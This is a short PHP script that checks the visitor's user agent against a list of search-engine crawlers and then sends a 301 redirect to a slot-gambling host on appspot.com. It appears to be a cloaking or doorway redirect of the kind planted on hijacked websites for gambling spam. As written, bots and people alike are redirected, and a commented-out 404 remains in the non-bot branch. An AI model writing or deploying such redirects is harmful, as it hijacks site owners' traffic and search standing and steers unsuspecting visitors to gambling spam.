<?
function isBot( $user_agent ) {
	if ( empty( $user_agent ) ) {
		return false;
	}

	$bots = [
		// Yandex
		'YandexBot',
		'YandexAccessibilityBot',
		'YandexMobileBot',
		'YandexDirectDyn',
		'YandexScreenshotBot',
		'YandexImages',
		'YandexVideo',
		'YandexVideoParser',
		'YandexMedia',
		'YandexBlogs',
		'YandexFavicons',
		'YandexWebmaster',
		'YandexPagechecker',
		'YandexImageResizer',
		'YandexAdNet',
		'YandexDirect',
		'YaDirectFetcher',
		'YandexCalendar',
		'YandexSitelinks',
		'YandexMetrika',
		'YandexNews',
		'YandexNewslinks',
		'YandexCatalog',
		'YandexAntivirus',
		'YandexMarket',
		'YandexVertis',
		'YandexForDomain',
		'YandexSpravBot',
		'YandexSearchShop',
		'YandexMedianaBot',
		'YandexOntoDB',
		'YandexOntoDBAPI',
		'YandexTurbo',
		'YandexVerticals',

		// Google
		'Googlebot',
		'Googlebot-Image',
		'Mediapartners-Google',
		'AdsBot-Google',
		'APIs-Google',
		'AdsBot-Google-Mobile',
		'AdsBot-Google-Mobile',
		'Googlebot-News',
		'Googlebot-Video',
		'AdsBot-Google-Mobile-Apps',

		// Other
		'Mail.RU_Bot',
		'bingbot',
		'Accoona',
		'ia_archiver',
		'Ask Jeeves',
		'OmniExplorer_Bot',
		'W3C_Validator',
		'WebAlta',
		'YahooFeedSeeker',
		'Yahoo!',
		'Ezooms',
		'Tourlentabot',
		'MJ12bot',
		'AhrefsBot',
		'SearchBot',
		'SiteStatus',
		'Nigma.ru',
		'Baiduspider',
		'Statsbot',
		'SISTRIX',
		'AcoonBot',
		'findlinks',
		'proximic',
		'OpenindexSpider',
		'statdom.ru',
		'Exabot',
		'Spider',
		'SeznamBot',
		'oBot',
		'C-T bot',
		'Updownerbot',
		'Snoopy',
		'heritrix',
		'Yeti',
		'DomainVader',
		'DCPbot',
		'PaperLiBot',
		'StackRambler',
		'msnbot',
		'msnbot-media',
		'msnbot-news',
	];

	foreach ( $bots as $bot ) {
		if ( stripos( $user_agent, $bot ) !== false ) {
			return $bot;
		}
	}

	return false;
}

$result = isBot( $_SERVER['HTTP_USER_AGENT'] );
if ( $result === false ) {

	// header('HTTP/1.0 404 Not Found');
	// exit;
	header( "HTTP/1.1 301 Moved Permanently" );
	header( 'Location:https://slot4moneyslots.nw.r.appspot.com' . $_SERVER['REQUEST_URI'] );
	exit;


} else {
	header( "HTTP/1.1 301 Moved Permanently" );
	header( 'Location:https://slot4moneyslots.nw.r.appspot.com' . $_SERVER['REQUEST_URI'] );
	exit;
}
?>